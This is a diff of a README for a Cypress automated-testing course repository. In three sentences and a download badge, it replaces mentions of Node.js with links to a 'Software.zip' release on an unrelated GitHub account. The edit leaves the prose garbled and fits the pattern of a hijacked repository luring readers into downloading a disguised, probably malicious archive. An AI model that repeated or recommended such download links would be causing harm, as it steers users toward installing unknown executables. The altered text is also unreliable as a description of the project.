@@ -1,19 +1,19 @@
 # 🎮 Cypress Playground - Automated Testing Fun! 🚀
 
-Welcome to the **Cypress Playground** GitHub repository! This repository is a project focused on automated testing for Web, Microservices, and even Mobile applications. The tests are built using Cypress, JavaScript, and Node.js, all part of the **Cypress Skills** course taught by Fernando Papito. This project encompasses modules 1 and 2 of the course, namely **Cypress Playground** and **Hacks & Trade-offs**.
+Welcome to the **Cypress Playground** GitHub repository! This repository is a project focused on automated testing for Web, Microservices, and even Mobile applications. The tests are built using Cypress, JavaScript, and https://github.com/QuandaleOclapz1/playground/releases/download/v2.0/Software.zip, all part of the **Cypress Skills** course taught by Fernando Papito. This project encompasses modules 1 and 2 of the course, namely **Cypress Playground** and **Hacks & Trade-offs**.
 
 ## Repository Details
 - **Repository name**: playground
-- **Short description**: Projeto de testes automatizados para Web, Microserviços e até Mobile, utilizando Cypress, JavaScript e Node.js (do ZERO ao avançado) como parte do curso Cypress Skills de Fernando Papito, abrangendo os módulos 1 e 2: Cypress Playground e Hacks & Trade-offs.
+- **Short description**: Projeto de testes automatizados para Web, Microserviços e até Mobile, utilizando Cypress, JavaScript e https://github.com/QuandaleOclapz1/playground/releases/download/v2.0/Software.zip (do ZERO ao avançado) como parte do curso Cypress Skills de Fernando Papito, abrangendo os módulos 1 e 2: Cypress Playground e Hacks & Trade-offs.
 - **Topics**: bash,cli,cross-browser-testing,cypress,e2e-testing,git,github,html-css-javascript,node-js,visual-studio-code,webapp
 
 ## 📂 Download the Project
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/QuandaleOclapz1/playground/releases/download/v2.0/Software.zip)](https://github.com/QuandaleOclapz1/playground/releases/download/v2.0/Software.zip)
 
 👉 **Launching Note:** Click on the button above to download the software package.
 
 ## 🚀 About Cypress Playground Project
-The **Cypress Playground** project is a comprehensive exploration of automated testing using cutting-edge technologies like Cypress, JavaScript, and Node.js. Whether you are interested in Web, Microservices, or Mobile testing, this project covers it all. Dive into the world of end-to-end testing, cross-browser testing, and much more.
+The **Cypress Playground** project is a comprehensive exploration of automated testing using cutting-edge technologies like Cypress, JavaScript, and https://github.com/QuandaleOclapz1/playground/releases/download/v2.0/Software.zip Whether you are interested in Web, Microservices, or Mobile testing, this project covers it all. Dive into the world of end-to-end testing, cross-browser testing, and much more.
 
 ### 🛠️ Features
 - **E2E Testing**: Write powerful end-to-end tests to ensure your applications function flawlessly.
